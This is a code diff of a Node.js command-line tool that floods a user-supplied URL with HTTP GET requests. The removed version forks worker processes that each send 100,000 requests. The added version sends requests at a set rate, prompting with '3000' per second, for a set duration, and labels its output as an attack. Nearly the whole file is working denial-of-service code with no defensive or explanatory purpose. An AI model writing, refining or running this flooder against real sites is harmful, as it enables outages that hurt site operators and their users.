@@ -1,92 +1,66 @@
 const http = require('http');
-const https = require('https');
-const readline = require('readline');
-const { fork } = require('child_process');
 const url = require('url');
+const readline = require('readline');
 
-// Create interface for reading input from the console
+// Read user input
 const rl = readline.createInterface({
   input: process.stdin,
   output: process.stdout
 });
 
-// Function to start the HTTP GET flood attack in a child process
-const startAttack = (targetUrl, requestsPerThread) => {
+// Function to send HTTP requests
+const sendRequest = (targetUrl) => {
   const parsedUrl = url.parse(targetUrl);
-  const protocol = parsedUrl.protocol === 'https:' ? https : http;
-  let requestCount = 0;
-
-  const sendRequest = () => {
-    return new Promise((resolve) => {
-      const options = {
-        hostname: parsedUrl.hostname,
-        port: parsedUrl.port || (protocol === https ? 443 : 80),
-        path: parsedUrl.path,
-        method: 'GET'
-      };
-
-      const req = protocol.request(options, (res) => {
-        res.on('data', () => {});
-        res.on('end', () => {});
-      });
-
-      req.on('error', (err) => {
-        // Ignore errors as they are expected
-      });
-
-      req.end(() => {
-        requestCount++;
-        resolve();
-      });
-    });
+  const options = {
+    hostname: parsedUrl.hostname,
+    port: parsedUrl.port || 80,
+    path: parsedUrl.path || '/',
+    method: 'GET'
   };
 
-  const runAttack = async () => {
-    const requestPromises = [];
+  const req = http.request(options, (res) => {
+    res.on('data', () => {});
+    res.on('end', () => {});
+  });
 
-    // Send 50,000 requests twice (100,000 requests total per thread)
-    for (let i = 0; i < requestsPerThread * 2; i++) {
-      requestPromises.push(sendRequest());
-    }
-
-    await Promise.all(requestPromises);
-    console.log(`Thread finished. Total requests sent: ${requestCount}`);
-  };
-
-  runAttack();
+  req.on('error', () => {});
+  req.end();
 };
 
-// Main function to handle user input and start child processes
-const main = () => {
-  rl.question('Enter target URL (e.g., http://example.com): ', (targetUrl) => {
-    rl.question('Enter the number of threads: ', (threads) => {
-      const threadCount = parseInt(threads, 10);
-      const requestsPerThread = 50000; // Each thread sends 50,000 requests twice
+// Main function to start the attack
+const startAttack = (targetUrl, requestsPerSecond, duration) => {
+  const interval = 1000 / requestsPerSecond;  // Interval between requests in milliseconds
+  const endTime = Date.now() + duration * 1000;
 
-      if (isNaN(threadCount)) {
-        console.error('Invalid number of threads');
+  console.log(`Starting attack on ${targetUrl} with ${requestsPerSecond} requests per second for ${duration} seconds`);
+
+  const attackInterval = setInterval(() => {
+    if (Date.now() >= endTime) {
+      clearInterval(attackInterval);
+      console.log('Attack completed.');
+      return;
+    }
+
+    sendRequest(targetUrl);
+  }, interval);
+};
+
+// Prompt user for input
+rl.question('Enter target URL: ', (targetUrl) => {
+  rl.question('Enter requests per second (e.g., 3000): ', (requestsPerSecond) => {
+    rl.question('Enter attack duration in seconds (e.g., 60): ', (duration) => {
+      const requestsPerSecondInt = parseInt(requestsPerSecond, 10);
+      const durationInt = parseInt(duration, 10);
+
+      if (isNaN(requestsPerSecondInt) || isNaN(durationInt) || requestsPerSecondInt <= 0 || durationInt <= 0) {
+        console.error('Invalid input. Please enter positive numbers for requests per second and duration.');
         rl.close();
         return;
       }
 
-      console.log(`Starting attack with ${threadCount} threads, each sending 100,000 requests.`);
-
-      // Start the specified number of child processes
-      for (let i = 0; i < threadCount; i++) {
-        const child = fork(__filename);
-        child.send({ targetUrl, requestsPerThread });
-      }
-
+      startAttack(targetUrl, requestsPerSecondInt, durationInt);
       rl.close();
     });
   });
-};
-
-// Child process message handler
-if (process.send) {
-  process.on('message', ({ targetUrl, requestsPerThread }) => {
-    startAttack(targetUrl, requestsPerThread);
-  });
-} else {
-  main();
-}
+});
+                                     
